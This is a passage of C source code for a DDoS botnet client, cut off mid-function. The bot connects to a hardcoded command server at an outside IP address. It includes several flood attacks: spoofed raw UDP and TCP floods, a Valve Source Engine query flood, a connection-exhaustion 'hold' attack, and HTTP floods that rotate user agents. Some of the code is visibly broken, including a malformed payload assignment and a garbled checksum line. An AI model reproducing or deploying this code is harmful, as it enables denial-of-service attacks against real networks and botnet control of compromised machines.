#include <stdlib.h>
#include <stdarg.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <strings.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>
#define SERVER_LIST_SIZE (sizeof(commServer) / sizeof(unsigned char *))
#define PAD_RIGHT 1
#define PAD_ZERO 2
#define PRINT_BUF_LEN 12
#define std_packet 1460
//
//
//
//
//
//
unsigned char *commServer[] = {"185.132.53.11:839"};

const char *useragents[] = {
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
"Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
};

int initConnection();
void makeRandomStr(unsigned char *buf, int length);
int sockprintf(int sock, char *formatStr, ...);
char *inet_ntoa(struct in_addr in);
int mainCommSock = 0, currentServer = -1, gotIP = 0;
uint32_t *pids;
uint64_t numpids = 0;
struct in_addr ourIP;
#define PHI 0x9e3779b9
static uint32_t Q[4096], c = 362436;
unsigned char macAddress[6] = {0};

void init_rand(uint32_t x)
{
        int i;

        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;

        for (i = 3; i < 4096; i++) Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}
uint32_t rand_cmwc(void)
{
        uint64_t t, a = 18782LL;
        static uint32_t i = 4095;
        uint32_t x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (uint32_t)(t >> 32);
        x = t + c;
        if (x < c) {
                x++;
                c++;
        }
        return (Q[i] = r - x);
}
in_addr_t getRandomIP(in_addr_t netmask) {
        in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
        return tmp ^ ( rand_cmwc() & ~netmask);
}
unsigned char *fdgets(unsigned char *buffer, int bufferSize, int fd)
{
    int got = 1, total = 0;
    while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
    return got == 0 ? NULL : buffer;
}
int getOurIP()
{
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if(sock == -1) return 0;

    struct sockaddr_in serv;
    memset(&serv, 0, sizeof(serv));
    serv.sin_family = AF_INET;
    serv.sin_addr.s_addr = inet_addr("8.8.8.8");
    serv.sin_port = htons(53);

    int err = connect(sock, (const struct sockaddr*) &serv, sizeof(serv));
    if(err == -1) return 0;

    struct sockaddr_in name;
    socklen_t namelen = sizeof(name);
    err = getsockname(sock, (struct sockaddr*) &name, &namelen);
    if(err == -1) return 0;

    ourIP.s_addr = name.sin_addr.s_addr;
    int cmdline = open("/proc/net/route", O_RDONLY);
    char linebuf[4096];
    while(fdgets(linebuf, 4096, cmdline) != NULL)
    {
        if(strstr(linebuf, "\t00000000\t") != NULL)
        {
            unsigned char *pos = linebuf;
            while(*pos != '\t') pos++;
            *pos = 0;
            break;
        }
        memset(linebuf, 0, 4096);
    }
    close(cmdline);

    if(*linebuf)
    {
        int i;
        struct ifreq ifr;
        strcpy(ifr.ifr_name, linebuf);
        ioctl(sock, SIOCGIFHWADDR, &ifr);
        for (i=0; i<6; i++) macAddress[i] = ((unsigned char*)ifr.ifr_hwaddr.sa_data)[i];
    }

    close(sock);
}
void trim(char *str)
{
        int i;
        int begin = 0;
        int end = strlen(str) - 1;

        while (isspace(str[begin])) begin++;

        while ((end >= begin) && isspace(str[end])) end--;
        for (i = begin; i <= end; i++) str[i - begin] = str[i];

        str[i - begin] = '\0';
}

static void printchar(unsigned char **str, int c)
{
        if (str) {
                **str = c;
                ++(*str);
        }
        else (void)write(1, &c, 1);
}

static int prints(unsigned char **out, const unsigned char *string, int width, int pad)
{
        register int pc = 0, padchar = ' ';

        if (width > 0) {
                register int len = 0;
                register const unsigned char *ptr;
                for (ptr = string; *ptr; ++ptr) ++len;
                if (len >= width) width = 0;
                else width -= len;
                if (pad & PAD_ZERO) padchar = '0';
        }
        if (!(pad & PAD_RIGHT)) {
                for ( ; width > 0; --width) {
                        printchar (out, padchar);
                        ++pc;
                }
        }
        for ( ; *string ; ++string) {
                printchar (out, *string);
                ++pc;
        }
        for ( ; width > 0; --width) {
                printchar (out, padchar);
                ++pc;
        }

        return pc;
}

static int printi(unsigned char **out, int i, int b, int sg, int width, int pad, int letbase)
{
        unsigned char print_buf[PRINT_BUF_LEN];
        register unsigned char *s;
        register int t, neg = 0, pc = 0;
        register unsigned int u = i;

        if (i == 0) {
                print_buf[0] = '0';
                print_buf[1] = '\0';
                return prints (out, print_buf, width, pad);
        }

        if (sg && b == 10 && i < 0) {
                neg = 1;
                u = -i;
        }

        s = print_buf + PRINT_BUF_LEN-1;
        *s = '\0';

        while (u) {
                t = u % b;
                if( t >= 10 )
                t += letbase - '0' - 10;
                *--s = t + '0';
                u /= b;
        }

        if (neg) {
                if( width && (pad & PAD_ZERO) ) {
                        printchar (out, '-');
                        ++pc;
                        --width;
                }
                else {
                        *--s = '-';
                }
        }

        return pc + prints (out, s, width, pad);
}

static int print(unsigned char **out, const unsigned char *format, va_list args )
{
        register int width, pad;
        register int pc = 0;
        unsigned char scr[2];

        for (; *format != 0; ++format) {
                if (*format == '%') {
                        ++format;
                        width = pad = 0;
                        if (*format == '\0') break;
                        if (*format == '%') goto out;
                        if (*format == '-') {
                                ++format;
                                pad = PAD_RIGHT;
                        }
                        while (*format == '0') {
                                ++format;
                                pad |= PAD_ZERO;
                        }
                        for ( ; *format >= '0' && *format <= '9'; ++format) {
                                width *= 10;
                                width += *format - '0';
                        }
                        if( *format == 's' ) {
                                register char *s = (char *)va_arg( args, int );
                                pc += prints (out, s?s:"(null)", width, pad); // this to
                                continue;
                        }
                        if( *format == 'd' ) {
                                pc += printi (out, va_arg( args, int ), 10, 1, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'x' ) {
                                pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'X' ) {
                                pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'A');
                                continue;
                        }
                        if( *format == 'u' ) {
                                pc += printi (out, va_arg( args, int ), 10, 0, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'c' ) {
                                scr[0] = (unsigned char)va_arg( args, int );
                                scr[1] = '\0';
                                pc += prints (out, scr, width, pad);
                                continue;
                        }
                }
                else {
out:
                        printchar (out, *format);
                        ++pc;
                }
        }
        if (out) **out = '\0';
        va_end( args );
        return pc;
}
int sockprintf(int sock, char *formatStr, ...)
{
        unsigned char *textBuffer = malloc(2048);
        memset(textBuffer, 0, 2048);
        char *orig = textBuffer;
        va_list args;
        va_start(args, formatStr);
        print(&textBuffer, formatStr, args);
        va_end(args);
        orig[strlen(orig)] = '\n';
        int q = send(sock,orig,strlen(orig), MSG_NOSIGNAL);
        free(orig);
        return q;
}

int getHost(unsigned char *toGet, struct in_addr *i)
{
        struct hostent *h;
        if((i->s_addr = inet_addr(toGet)) == -1) return 1;
        return 0;
}

void makeRandomStr(unsigned char *buf, int length)
{
        int i = 0;
        for(i = 0; i < length; i++) buf[i] = (rand_cmwc()%(91-65))+65;
}

int recvLine(int socket, unsigned char *buf, int bufsize)
{
        memset(buf, 0, bufsize);
        fd_set myset;
        struct timeval tv;
        tv.tv_sec = 30;
        tv.tv_usec = 0;
        FD_ZERO(&myset);
        FD_SET(socket, &myset);
        int selectRtn, retryCount;
        if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
                while(retryCount < 10)
                {
                        tv.tv_sec = 30;
                        tv.tv_usec = 0;
                        FD_ZERO(&myset);
                        FD_SET(socket, &myset);
                        if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
                                retryCount++;
                                continue;
                        }
                        break;
                }
        }
        unsigned char tmpchr;
        unsigned char *cp;
        int count = 0;
        cp = buf;
        while(bufsize-- > 1)
        {
                if(recv(mainCommSock, &tmpchr, 1, 0) != 1) {
                        *cp = 0x00;
                        return -1;
                }
                *cp++ = tmpchr;
                if(tmpchr == '\n') break;
                count++;
        }
        *cp = 0x00;
        return count;
}

int connectTimeout(int fd, char *host, int port, int timeout)
{
        struct sockaddr_in dest_addr;
        fd_set myset;
        struct timeval tv;
        socklen_t lon;

        int valopt;
        long arg = fcntl(fd, F_GETFL, NULL);
        arg |= O_NONBLOCK;
        fcntl(fd, F_SETFL, arg);

        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(port);
        if(getHost(host, &dest_addr.sin_addr)) return 0;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
        int res = connect(fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

        if (res < 0) {
                if (errno == EINPROGRESS) {
                        tv.tv_sec = timeout;
                        tv.tv_usec = 0;
                        FD_ZERO(&myset);
                        FD_SET(fd, &myset);
                        if (select(fd+1, NULL, &myset, NULL, &tv) > 0) {
                                lon = sizeof(int);
                                getsockopt(fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
                                if (valopt) return 0;
                        }
                        else return 0;
                }
                else return 0;
        }

        arg = fcntl(fd, F_GETFL, NULL);
        arg &= (~O_NONBLOCK);
        fcntl(fd, F_SETFL, arg);

        return 1;
}

int listFork()
{
        uint32_t parent, *newpids, i;
        parent = fork();
        if (parent <= 0) return parent;
        numpids++;
        newpids = (uint32_t*)malloc((numpids + 1) * 4);
        for (i = 0; i < numpids - 1; i++) newpids[i] = pids[i];
        newpids[numpids - 1] = parent;
        free(pids);
        pids = newpids;
        return parent;
}

unsigned short csum (unsigned short *buf, int count)
{
        register uint64_t sum = 0;
        while( count > 1 ) { sum += *buf++; count -= 2; }
        if(count > 0) { sum += *(unsigned char *)buf; }
        while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
        return (uint16_t)(~sum);
}

unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph)
{

        struct tcp_pseudo
        {
                unsigned long src_addr;
                unsigned long dst_addr;
                unsigned char zero;
                unsigned char proto;
                unsigned short length;
        } pseudohead;
        unsigned short total_len = iph->tot_len;
        pseudohead.src_addr=iph->saddr;
        pseudohead.dst_addr=iph->daddr;
        pseudohead.zero=0;
        pseudohead.proto=IPPROTO_TCP;
        pseudohead.length=htons(sizeof(struct tcphdr));
        int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
        unsigned short *tcp = malloc(totaltcp_len);
        memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
        memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
        unsigned short output = csum(tcp,totaltcp_len);
        free(tcp);
        return output;
}

void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize)
{
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetSize;
        iph->id = rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = protocol;
        iph->check = 0;
        iph->saddr = source;
        iph->daddr = dest;
}

void SendUDP(unsigned char *target, int port, int timeEnd, int packetsize, int pollinterval, int spoofit) {
        struct sockaddr_in dest_addr;
        dest_addr.sin_family = AF_INET;
        if(port == 0) dest_addr.sin_port = rand_cmwc();
        else dest_addr.sin_port = htons(port);
        if(getHost(target, &dest_addr.sin_addr)) return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
        register unsigned int pollRegister;
        pollRegister = pollinterval;	
                int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
                if(!sockfd) {
                        return;
                }
                int tmp = 1;
                if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0) {
                        return;
                }
                int counter = 50;
                while(counter--) {
                        srand(time(NULL) ^ rand_cmwc());
                        init_rand(rand());
                }
                in_addr_t netmask;
                netmask = ( ~((1 << (32 - spoofit)) - 1) );
                unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
                struct iphdr *iph = (struct iphdr *)packet;
                struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
                makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
                udph->len = htons(sizeof(struct udphdr) + packetsize);
                udph->source = rand_cmwc();
                udph->dest = (port == 0 ? rand_cmwc() : htons(port));
                udph->check = 0;
                makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);
                iph->check = csum ((unsigned short *) packet, iph->tot_len);
                int end = time(NULL) + timeEnd;
                register unsigned int i = 0;
                while(1) {
                        sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
                        udph->source = rand_cmwc();
                        udph->dest = (port == 0 ? rand_cmwc() : htons(port));
                        iph->id = rand_cmwc();
                        iph->saddr = htonl( getRandomIP(netmask) );
                        iph->check = csum ((unsigned short *) packet, iph->tot_len);
                        if(i == pollRegister) {
                                if(time(NULL) > end) break;
                                i = 0;
                                continue;
                        }
                        i++;
                }
        }
void ftcp(unsigned char *target, int port, int timeEnd, int spoofit, unsigned char *flags, int packetsize, int pollinterval)
{
        register unsigned int pollRegister;
        pollRegister = pollinterval;

        struct sockaddr_in dest_addr;

        dest_addr.sin_family = AF_INET;
        if(port == 0) dest_addr.sin_port = rand_cmwc();
        else dest_addr.sin_port = htons(port);
        if(getHost(target, &dest_addr.sin_addr)) return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if(!sockfd)
        {
                return;
        }

        int tmp = 1;
        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
        {
                return;
        }

        in_addr_t netmask;

        if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
        else netmask = ( ~((1 << (32 - spoofit)) - 1) );

        unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);

        makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);

        tcph->source = rand_cmwc();
        tcph->seq = rand_cmwc();
        tcph->ack_seq = 0;
        tcph->doff = 5;

        if(!strcmp(flags, "all"))
        {
                tcph->syn = 1;
                tcph->rst = 1;
                tcph->fin = 1;
                tcph->ack = 1;
                tcph->psh = 1;
        } else {
                unsigned char *pch = strtok(flags, ",");
                while(pch)
                {
                        if(!strcmp(pch,         "syn"))
                        {
                                tcph->syn = 1;
                        } else if(!strcmp(pch,  "rst"))
                        {
                                tcph->rst = 1;
                        } else if(!strcmp(pch,  "fin"))
                        {
                                tcph->fin = 1;
                        } else if(!strcmp(pch,  "ack"))
                        {
                                tcph->ack = 1;
                        } else if(!strcmp(pch,  "psh"))
                        {
                                tcph->psh = 1;
                        } else {
                        }
                        pch = strtok(NULL, ",");
                }
        }

        tcph->window = rand_cmwc();
        tcph->check = 0;
        tcph->urg_ptr = 0;
        tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
        tcph->check = tcpcsum(iph, tcph);

        iph->check = csum ((unsigned short *) packet, iph->tot_len);

        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        while(1)
        {
                sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

                iph->saddr = htonl( getRandomIP(netmask) );
                iph->id = rand_cmwc();
                tcph->seq = rand_cmwc();
                tcph->source = rand_cmwc();
                tcph->check = 0;
                tcph->check = tcpcsum(iph, tcph);
                iph->check = csum ((unsigned short *) packet, iph->tot_len);

                if(i == pollRegister)
                {
                        if(time(NULL) > end) break;
                        i = 0;
                        continue;
                }
                i++;
        }
}
	void SendSTDHEX(unsigned char *ip, int port, int secs)
	{
	int std_hex;
	std_hex = socket(AF_INET, SOCK_DGRAM, 0);
	time_t start = time(NULL);
	struct sockaddr_in sin;
	struct hostent *hp;
	hp = gethostbyname(ip);
	bzero((char*) &sin,sizeof(sin));
	bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
	sin.sin_family = hp->h_addrtype;
	sin.sin_port = port;
	unsigned int a = 0;
	while(1)
	{
        char *rhexstring[] = {
		"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58",
		"/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58",
        };
		if (a >= 50)
		{
			send(std_hex, rhexstring, std_packet, 0);
			connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
			if (time(NULL) >= start + secs)
			{
				close(std_hex);
				_exit(0);
			}
			a = 0;
		}
		a++;
	}
}


void sendHOLD(unsigned char *ip, int port, int end_time)
{

        int max = getdtablesize() / 2, i;

        struct sockaddr_in dest_addr;
        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(port);
        if(getHost(ip, &dest_addr.sin_addr)) return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

        struct state_t
        {
                int fd;
                uint8_t state;
        } fds[max];
        memset(fds, 0, max * (sizeof(int) + 1));

        fd_set myset;
        struct timeval tv;
        socklen_t lon;
        int valopt, res;

        unsigned char *watwat = malloc(1024);
        memset(watwat, 0, 1024);

        int end = time(NULL) + end_time;
        while(end > time(NULL))
        {
                for(i = 0; i < max; i++)
                {
                        switch(fds[i].state)
                        {
                        case 0:
                                {
                                        fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
                                        fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
                                        if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) != -1 || errno != EINPROGRESS) close(fds[i].fd);
                                        else fds[i].state = 1;
                                }
                                break;

                        case 1:
                                {
                                        FD_ZERO(&myset);
                                        FD_SET(fds[i].fd, &myset);
                                        tv.tv_sec = 0;
                                        tv.tv_usec = 10000;
                                        res = select(fds[i].fd+1, NULL, &myset, NULL, &tv);
                                        if(res == 1)
                                        {
                                                lon = sizeof(int);
                                                getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
                                                if(valopt)
                                                {
                                                        close(fds[i].fd);
                                                        fds[i].state = 0;
                                                } else {
                                                        fds[i].state = 2;
                                                }
                                        } else if(res == -1)
                                        {
                                                close(fds[i].fd);
                                                fds[i].state = 0;
                                        }
                                }
                                break;

                        case 2:
                                {
                                        FD_ZERO(&myset);
                                        FD_SET(fds[i].fd, &myset);
                                        tv.tv_sec = 0;
                                        tv.tv_usec = 10000;
                                        res = select(fds[i].fd+1, NULL, NULL, &myset, &tv);
                                        if(res != 0)
                                        {
                                                close(fds[i].fd);
                                                fds[i].state = 0;
                                        }
                                }
                                break;
                        }
                }
        }
}


	int socket_connect(char *host, in_port_t port) {
	struct hostent *hp;
	struct sockaddr_in addr;
	int on = 1, sock;     
	if ((hp = gethostbyname(host)) == NULL) return 0;
	bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
	addr.sin_port = htons(port);
	addr.sin_family = AF_INET;
	sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));
	if (sock == -1) return 0;
	if (connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) return 0;
	return sock;
}                                      
void makevsepacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize)
{
    char *vse_payload;
    int vse_payload_len;
    vse_payload = "\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79 + /x54/x53/x6f/x75/x72/x63/x65/x20/x45/x6e/x67/x69/x6e/x65/x20/x51/x75/x65/x72/x79 rfdknjms", &vse_payload_len;
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetSize + vse_payload_len;
        iph->id = rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = protocol;
        iph->check = 0;
        iph->saddr = source;
        iph->daddr = dest;
}//RyRdm9//S4tan's USB
void vseattack(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime)
{
    char *vse_payload;
    int vse_payload_len;
    vse_payload = "\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79 + /x54/x53/x6f/x75/x72/x63/x65/x20/x45/x6e/x67/x69/x6e/x65/x20/x51/x75/x65/x72/x79 rfdknjms", &vse_payload_len;
	struct sockaddr_in dest_addr;
	dest_addr.sin_family = AF_INET;
	if(port == 0) dest_addr.sin_port = rand_cmwc();
	else dest_addr.sin_port = htons(port);
	if(getHost(target, &dest_addr.sin_addr)) return;
	memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
	register unsigned int pollRegister;
	pollRegister = pollinterval;
	if(spoofit == 32) {
	int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if(!sockfd) {
	return;
	}
	unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
	if(buf == NULL) return;
	memset(buf, 0, packetsize + 1);
	makeRandomStr(buf, packetsize);
	int end = time(NULL) + timeEnd;
	register unsigned int i = 0;
	register unsigned int ii = 0;
	while(1) {
	sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
	if(i == pollRegister) {
	if(port == 0) dest_addr.sin_port = rand_cmwc();
	if(time(NULL) > end) break;
	i = 0;
	continue;
					}
	i++;
	if(ii == sleepcheck) {
	usleep(sleeptime*1000);
	ii = 0;
	continue;
					}
	ii++;
			}
			} else {
	int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
	if(!sockfd) {
	return;
				}
	int tmp = 1;
	if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0) {
	return;
				}
	int counter = 50;
	while(counter--) {
	srand(time(NULL) ^ rand_cmwc());
				}
	in_addr_t netmask;
	if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
	else netmask = ( ~((1 << (32 - spoofit)) - 1) );
	unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
	struct iphdr *iph = (struct iphdr *)packet;
	struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
	makevsepacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
	udph->len = htons(sizeof(struct udphdr) + packetsize + vse_payload_len);
	udph->source = rand_cmwc();
	udph->dest = (port == 0 ? rand_cmwc() : htons(port));
	udph->check = 0;
	udph->check = (iph, udph, udph->len, sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len);
	makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);
	iph->check = csum ((unsigned short *) packet, iph->tot_len);
	int end = time(NULL) + timeEnd;
	register unsigned int i = 0;
	register unsigned int ii = 0;
	while(1) {
	sendto(sockfd, packet, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len, sizeof(packet), (struct sockaddr *)&dest_addr, sizeof(dest_addr));
	udph->source = rand_cmwc();
	udph->dest = (port == 0 ? rand_cmwc() : htons(port));
	iph->id = rand_cmwc();
	iph->saddr = htonl( getRandomIP(netmask) );
	iph->check = csum ((unsigned short *) packet, iph->tot_len);
	if(i == pollRegister) {
	if(time(NULL) > end) break;
	i = 0;
	continue;
			}
	i++;
	if(ii == sleepcheck) {
	usleep(sleeptime*1000);
	ii = 0;
	continue;
				}
	ii++;
			}
		}
	}


	void SendHTTPHex(char *method, char *host, in_port_t port, char *path, int timeEnd, int power) {
	int socket, i, end = time(NULL) + timeEnd, sendIP = 0;
	char request[512], buffer[1], hex_payload[2048];
	sprintf(hex_payload, "\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA");
	for (i = 0; i < power; i++) {
		sprintf(request, "%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", method, hex_payload, host, useragents[(rand() % 36)]);
		if (fork()) {
			while (end > time(NULL)) {
				socket = socket_connect(host, port);
				if (socket != 0) {
					write(socket, request, strlen(request));
					read(socket, buffer, 1);
					close(socket);
				}
			}
			exit(0);
		}
	}
}
void sendHTTPtwo(char *method, char *host, in_port_t port, char *path, int timeEnd, int power) {
	int socket, i, end = time(NULL) + timeEnd, sendIP = 0;
	char request[512], buffer[1], hex_3payload[2048];
